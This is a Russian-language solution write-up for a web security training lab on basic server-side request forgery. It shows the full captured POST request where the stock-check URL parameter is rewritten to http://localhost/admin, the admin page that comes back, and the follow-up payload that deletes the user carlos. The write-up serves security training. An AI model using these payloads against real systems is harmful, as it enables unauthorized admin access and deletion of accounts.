# Basic SSRF against the local server
APPRENTICE

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

## Решение
При проверке наличия товара отправляется запрос `stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1`. Заменю значение параметра stockApi на `http://localhost/admin`:
```
POST /product/stock HTTP/2
Host: 0ac1004a0304208980abbcc7008c0019.web-security-academy.net
Cookie: session=UthRCAtTyRcX27ePfuP8HdoyL1udYfug
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ac1004a0304208980abbcc7008c0019.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: https://0ac1004a0304208980abbcc7008c0019.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

stockApi=http://localhost/admin
```
```
<div theme="">
    <section class="maincontainer">
        <div class="container is-page">
            <header class="navigation-header">
                <section class="top-links">
                    <a href=/>Home</a><p>|</p>
                    <a href="/admin">Admin panel</a><p>|</p>
                    <a href="/my-account">My account</a><p>|</p>
                </section>
            </header>
            <header class="notification-header">
            </header>
            <section>
                <h1>Users</h1>
                <div>
                    <span>wiener - </span>
                    <a href="/admin/delete?username=wiener">Delete</a>
                </div>
                <div>
                    <span>carlos - </span>
                    <a href="/admin/delete?username=carlos">Delete</a>
                </div>
            </section>
            <br>
            <hr>
        </div>
    </section>
    <div class="footer-wrapper">
    </div>
</div>
```
В html, пришедшем с ответом, есть ссылка на удаление пользователя carlos. Отправлю этот URL с запросом:

`stockApi=http://localhost/admin/delete?username=carlos`

Задание выполнено.
